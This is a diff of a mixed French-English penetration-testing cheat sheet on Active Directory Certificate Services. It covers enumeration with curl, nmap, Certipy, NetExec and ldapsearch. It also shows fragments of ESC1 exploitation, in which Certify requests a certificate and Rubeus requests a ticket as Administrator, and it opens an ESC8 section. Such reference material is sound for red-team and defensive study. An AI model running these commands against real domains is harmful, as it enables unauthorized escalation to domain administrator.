@@ -1,40 +1,26 @@
 https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
 # Énumération
 
-**Sans credentials (réseau) :**
+## Network only
 ```bash
 # ADCS expose des interfaces web par défaut
 curl -k https://dc.domain.local/certsrv
 nmap -p 443,80 --script http-title <dc_ip>
 ```
-
-**Avec credentials (LDAP) :**
+## Certipy
 ```bash
 certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
+certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1 -vulnerable
 ```
-
-Certipy interroge LDAP et cherche des objets dans :
-
-```
-CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
-```
-
-Si un objet `pKIEnrollmentService` existe → ADCS est présent.
-
-**NetExec**
+## NetExec
 ```bash
 netexec ldap domain.lab -u username -p password -M adcs
 ```
-
-**ldapsearch**
+## ldapsearch
 ```bash
-ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
+ldapsearch -H ldap://dc_IP -x -LLL -D 'user@domain.local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
 ```
 
-CobaltStrike
-```
-ldapsearch (|(objectClass=pKIEnrollmentService)(objectClass=pKICertificateTemplate)) --attributes *,ntsecuritydescriptor
-```
 # ESC1
 
 1. Enumerate the certificate authority for vulnerable templates.
@@ -52,7 +38,7 @@ execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
 ```
 
-# ESC8 - coercition vers domain admin
+# ESC8
 
 Pré-requis :
 
